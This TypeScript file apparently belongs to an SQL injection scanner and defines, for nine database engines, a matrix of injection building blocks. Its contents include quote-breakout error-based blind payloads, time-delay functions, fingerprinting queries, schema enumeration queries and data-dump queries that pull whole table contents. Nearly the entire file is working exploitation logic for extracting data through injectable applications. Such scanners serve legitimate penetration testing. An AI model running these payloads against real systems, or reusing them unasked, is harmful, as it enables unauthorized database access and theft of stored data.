/**
 * Sentinel SQL X — Apex Sovereign Core: Dialect Capability Matrix
 *
 * Master declarative matrix defining syntax capabilities, query templates,
 * casting functions, batch multi-row aggregations, and runtime exception
 * triggers across all SQL and NewSQL database engines.
 */

import { DbmsType } from '../../../types/sqlScanner';

export interface DialectCapabilities {
  dbms: DbmsType;
  commentSingle: string;
  commentMulti: [string, string];
  stringConcatOp: string;
  stringConcatFn?: (parts: string[]) => string;
  substringFn: (expr: string, pos: number, len: number) => string;
  asciiFn: (expr: string) => string;
  charFn: (code: number) => string;
  lengthFn: (expr: string) => string;
  limitOffset: (limit: number, offset: number) => string;
  limit1: string;
  castToInt: (expr: string) => string;
  castToString: (expr: string) => string;
  runtimeExceptionTrue: string;
  runtimeExceptionFalse: string;
  conditionalErrorWrapper: (condition: string, table?: string, where?: string) => { truePayload: string; falsePayload: string };
  batchAggregateRows: (expr: string, separator?: string) => string;
  sleepFn: (seconds: number) => string;
  versionQuery: string;
  currentUserQuery: string;
  currentDbQuery: string;
  tableCatalogQuery: (offset?: number, limit?: number) => string;
  columnCatalogQuery: (table: string, offset?: number, limit?: number) => string;
  dataDumpQuery: (table: string, columns: string[], limit?: number, where?: string) => string;
}

export class DialectMatrix {
  private static capabilities: Map<DbmsType, DialectCapabilities> = new Map();

  static {
    // ─── PostgreSQL ──────────────────────────────────────────────────────────
    this.capabilities.set('PostgreSQL', {
      dbms: 'PostgreSQL',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS int)`,
      castToString: (expr) => `CAST((${expr}) AS text)`,
      runtimeExceptionTrue: '1/(SELECT 0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS text), '${sep}')`,
      sleepFn: (seconds) => `pg_sleep(${seconds})`,
      versionQuery: 'SELECT version()',
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table.toLowerCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `COALESCE(CAST(${c} AS text),'')`).join("||':::'||");
        return `SELECT STRING_AGG(${concatExpr}, E'\\n') FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}) t`;
      },
    });

    // ─── MySQL / MariaDB ────────────────────────────────────────────────────
    const mySqlCap: DialectCapabilities = {
      dbms: 'MySQL',
      commentSingle: '#',
      commentMulti: ['/*', '*/'],
      stringConcatOp: ' ',
      stringConcatFn: (parts) => `CONCAT(${parts.join(',')})`,
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${offset},${limit}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS SIGNED)`,
      castToString: (expr) => `CAST((${expr}) AS CHAR)`,
      runtimeExceptionTrue: 'EXP(710)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT IF(${condition}, EXP(710), 1)${fromClause})-- -`,
          falsePayload: `' AND (SELECT IF(NOT (${condition}), EXP(710), 1)${fromClause})-- -`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `GROUP_CONCAT(${expr} SEPARATOR '${sep}')`,
      sleepFn: (seconds) => `sleep(${seconds})`,
      versionQuery: 'SELECT @@version',
      currentUserQuery: 'SELECT current_user()',
      currentDbQuery: 'SELECT database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT ${offset},${limit}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='${table}' LIMIT ${offset},${limit}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = `CONCAT_WS(':::', ${columns.map((c) => `IFNULL(${c},'')`).join(',')})`;
        return `SELECT GROUP_CONCAT(${concatExpr} SEPARATOR 0x0a) FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}) t`;
      },
    };
    this.capabilities.set('MySQL', mySqlCap);
    this.capabilities.set('MariaDB', { ...mySqlCap, dbms: 'MariaDB' });

    // ─── Microsoft SQL Server ──────────────────────────────────────────────
    this.capabilities.set('Microsoft SQL Server', {
      dbms: 'Microsoft SQL Server',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '+',
      stringConcatFn: (parts) => parts.join('+'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LEN(${expr})`,
      limitOffset: (limit, offset) => `OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY`,
      limit1: 'TOP 1',
      castToInt: (expr) => `CONVERT(int, (${expr}))`,
      castToString: (expr) => `CONVERT(varchar(max), (${expr}))`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''}` : '';
        return {
          truePayload: `' AND 1=(SELECT TOP 1 CASE WHEN (${condition}) THEN 1/0 ELSE 1 END${fromClause})--`,
          falsePayload: `' AND 1=(SELECT TOP 1 CASE WHEN (NOT (${condition})) THEN 1/0 ELSE 1 END${fromClause})--`,
        };
      },
      batchAggregateRows: (expr, _sep = ':::') => `(SELECT ${expr} + ':::' FOR XML PATH(''))`,
      sleepFn: (seconds) => `WAITFOR DELAY '0:0:${seconds}'`,
      versionQuery: 'SELECT @@VERSION',
      currentUserQuery: 'SELECT SYSTEM_USER',
      currentDbQuery: 'SELECT DB_NAME()',
      tableCatalogQuery: (_offset = 0, limit = 50) =>
        `SELECT TOP ${limit} name FROM sys.tables ORDER BY name`,
      columnCatalogQuery: (table, _offset = 0, limit = 50) =>
        `SELECT TOP ${limit} name FROM sys.columns WHERE object_id=OBJECT_ID('${table}') ORDER BY column_id`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `ISNULL(CAST(${c} AS varchar(max)),'')`).join("+':::'+");
        return `SELECT (SELECT TOP ${limit} ${concatExpr} + CHAR(10) FROM ${table} ${where ? `WHERE ${where}` : ''} FOR XML PATH(''))`;
      },
    });

    // ─── Oracle ─────────────────────────────────────────────────────────────
    this.capabilities.set('Oracle', {
      dbms: 'Oracle',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTR(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (_limit, _offset) => ``, // Oracle uses ROWNUM or FETCH FIRST
      limit1: 'WHERE ROWNUM=1',
      castToInt: (expr) => `TO_NUMBER((${expr}))`,
      castToString: (expr) => `TO_CHAR((${expr}))`,
      runtimeExceptionTrue: 'TO_CHAR(1/0)',
      runtimeExceptionFalse: "''",
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ' WHERE ROWNUM=1'}` : ' FROM dual';
        return {
          truePayload: `'||(SELECT CASE WHEN (${condition}) THEN TO_CHAR(1/0) ELSE '' END${fromClause})||'`,
          falsePayload: `'||(SELECT CASE WHEN (NOT (${condition})) THEN TO_CHAR(1/0) ELSE '' END${fromClause})||'`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `LISTAGG(${expr}, '${sep}') WITHIN GROUP (ORDER BY 1)`,
      sleepFn: (seconds) => `dbms_pipe.receive_message(('a'),${seconds})`,
      versionQuery: 'SELECT banner FROM v$version WHERE ROWNUM=1',
      currentUserQuery: 'SELECT user FROM dual',
      currentDbQuery: 'SELECT ora_database_name FROM dual',
      tableCatalogQuery: (_offset = 0, limit = 50) =>
        `SELECT table_name FROM user_tables WHERE ROWNUM<=${limit}`,
      columnCatalogQuery: (table, _offset = 0, limit = 50) =>
        `SELECT column_name FROM all_tab_columns WHERE table_name='${table.toUpperCase()}' AND ROWNUM<=${limit}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `NVL(TO_CHAR(${c}),'')`).join("||':::'||");
        return `SELECT LISTAGG(${concatExpr}, CHR(10)) WITHIN GROUP (ORDER BY 1) FROM (SELECT * FROM ${table} ${where ? `WHERE ${where} AND ` : 'WHERE '} ROWNUM<=${limit})`;
      },
    });

    // ─── SQLite ─────────────────────────────────────────────────────────────
    this.capabilities.set('SQLite', {
      dbms: 'SQLite',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTR(${expr},${pos},${len})`,
      asciiFn: (expr) => `UNICODE(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS integer)`,
      castToString: (expr) => `CAST((${expr}) AS text)`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/0 ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/0 ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `GROUP_CONCAT(${expr}, '${sep}')`,
      sleepFn: (_seconds) => `randomblob(100000000)`,
      versionQuery: 'SELECT sqlite_version()',
      currentUserQuery: "SELECT 'sqlite_user'",
      currentDbQuery: "SELECT 'main'",
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT name FROM sqlite_master WHERE type='table' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, _offset = 0, _limit = 50) =>
        `SELECT sql FROM sqlite_master WHERE type='table' AND name='${table}'`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `IFNULL(${c},'')`).join("||':::'||");
        return `SELECT GROUP_CONCAT(${concatExpr}, CHAR(10)) FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit})`;
      },
    });

    // ─── IBM Db2 ────────────────────────────────────────────────────────────
    this.capabilities.set('IBM Db2', {
      dbms: 'IBM Db2',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTR(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'FETCH FIRST 1 ROWS ONLY',
      castToInt: (expr) => `CAST((${expr}) AS integer)`,
      castToString: (expr) => `CAST((${expr}) AS varchar(255))`,
      runtimeExceptionTrue: '1/(SELECT 0 FROM SYSIBM.SYSDUMMY1)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} FETCH FIRST 1 ROWS ONLY` : ' FROM SYSIBM.SYSDUMMY1';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0 FROM SYSIBM.SYSDUMMY1) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0 FROM SYSIBM.SYSDUMMY1) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `LISTAGG(${expr}, '${sep}')`,
      sleepFn: (_seconds) => `(SELECT COUNT(*) FROM syscat.columns AS c1, syscat.columns AS c2)`,
      versionQuery: 'SELECT versionnumber FROM sysibmadm.env_sys_info',
      currentUserQuery: 'SELECT user FROM sysibm.sysdummy1',
      currentDbQuery: 'SELECT current_server FROM sysibm.sysdummy1',
      tableCatalogQuery: (_offset = 0, limit = 50) =>
        `SELECT tabname FROM syscat.tables WHERE tabschema=CURRENT USER FETCH FIRST ${limit} ROWS ONLY`,
      columnCatalogQuery: (table, _offset = 0, limit = 50) =>
        `SELECT colname FROM syscat.columns WHERE tabname='${table.toUpperCase()}' FETCH FIRST ${limit} ROWS ONLY`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} FETCH FIRST ${limit} ROWS ONLY`;
      },
    });

    // ─── H2 Database ────────────────────────────────────────────────────────
    this.capabilities.set('H2', {
      dbms: 'H2',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS int)`,
      castToString: (expr) => `CAST((${expr}) AS varchar)`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/0 ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/0 ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `GROUP_CONCAT(${expr} SEPARATOR '${sep}')`,
      sleepFn: (_seconds) => `random_uuid()`,
      versionQuery: 'SELECT H2VERSION()',
      currentUserQuery: 'SELECT USER()',
      currentDbQuery: 'SELECT DATABASE()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema='PUBLIC' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table.toUpperCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    });

    // ─── Microsoft Access ───────────────────────────────────────────────────
    this.capabilities.set('Microsoft Access', {
      dbms: 'Microsoft Access',
      commentSingle: '%00',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '&',
      stringConcatFn: (parts) => parts.join('&'),
      substringFn: (expr, pos, len) => `MID(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASC(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LEN(${expr})`,
      limitOffset: (_limit, _offset) => ``,
      limit1: 'TOP 1',
      castToInt: (expr) => `CINT(${expr})`,
      castToString: (expr) => `CSTR(${expr})`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''}` : '';
        return {
          truePayload: `' AND IIF(${condition}, 1/0, 1)=1${fromClause}`,
          falsePayload: `' AND IIF(${condition}, 1, 1/0)=1${fromClause}`,
        };
      },
      batchAggregateRows: (expr, _sep = ':::') => expr,
      sleepFn: (_seconds) => `IIF(1=1, 1, 1)`,
      versionQuery: 'SELECT @@VERSION',
      currentUserQuery: "SELECT 'MSAccess_User'",
      currentDbQuery: "SELECT 'MSAccess_DB'",
      tableCatalogQuery: (_offset = 0, limit = 50) =>
        `SELECT TOP ${limit} Name FROM MSysObjects WHERE Type=1 AND Flags=0`,
      columnCatalogQuery: (_table, _offset = 0, _limit = 50) =>
        `SELECT TOP 50 Name FROM MSysObjects`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join('&');
        return `SELECT TOP ${limit} ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''}`;
      },
    });

    // ─── Generic SQL Fallback ────────────────────────────────────────────────
    this.capabilities.set('Generic SQL', {
      dbms: 'Generic SQL',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS int)`,
      castToString: (expr) => `CAST((${expr}) AS varchar(255))`,
      runtimeExceptionTrue: '1/(SELECT 0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS varchar(255)), '${sep}')`,
      sleepFn: (seconds) => `sleep(${seconds})`,
      versionQuery: 'SELECT @@version',
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    });
  }

  public static get(dbms: DbmsType = 'Generic SQL'): DialectCapabilities {
    return this.capabilities.get(dbms) || this.capabilities.get('Generic SQL')!;
  }

  public static getAllSupportedDbms(): DbmsType[] {
    return Array.from(this.capabilities.keys());
  }
}
